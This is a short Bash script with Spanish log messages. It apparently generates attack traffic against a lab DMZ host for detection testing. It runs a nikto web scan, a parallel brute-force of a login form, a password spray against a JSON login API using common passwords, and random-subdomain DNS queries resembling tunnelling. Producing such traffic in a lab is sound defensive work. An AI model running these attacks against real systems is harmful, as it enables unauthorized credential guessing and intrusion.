#!/usr/bin/env bash
DMZ=10.10.30.10
LOG=~/ataques2-$(date +%Y%m%d-%H%M%S).txt
m(){ printf '%s  %s\n' "$(date -u +%FT%T%z)" "$*" | tee -a "$LOG"; }
g(){ m "-- pausa 30s --"; sleep 30; }
m "=== INICIO v2 (todo con timeout) ==="
m "check web -> $(curl -s -o /dev/null -m3 -w 'http_%{http_code}' http://$DMZ/ 2>&1 || echo SIN_RESPUESTA)"
m "[2] web-scan INICIO"; timeout 150 nikto -h "http://$DMZ" -maxtime 120s >>"$LOG" 2>&1; m "[2] web-scan FIN (rc=$?)"; g
m "[3] brute-force INICIO"; timeout 140 bash -c 'DUR=120; F=$(($(date +%s)+DUR)); for i in $(seq 20); do (while [ $(date +%s) -lt $F ]; do curl -s -o /dev/null -m2 --data "user=admin&pass=x$RANDOM" "http://'"$DMZ"'/login"; done) & done; wait'; m "[3] brute-force FIN"; g
m "[4] password-spray INICIO"; for pw in admin123 password123 letmein123 qwerty123 welcome123 changeme123 spring2026 summer2026 test1234 demo12345; do timeout 3 curl -s -o /dev/null -m2 -H 'Content-Type: application/json' -X POST --data "{\"username\":\"demo\",\"password\":\"$pw\"}" "http://$DMZ/api/login"; sleep 0.2; done; m "[4] password-spray FIN"; g
m "[5] dns-entropy INICIO"; for i in $(seq 40); do L=$(head -c 12 /dev/urandom | base32 2>/dev/null | tr -d '=' | tr 'A-Z' 'a-z' | head -c 12); timeout 3 dig +short "@$DMZ" "$L.ppi.lab" A >/dev/null 2>&1; sleep 0.3; done; m "[5] dns-entropy FIN"
m "=== FIN v2 ==="
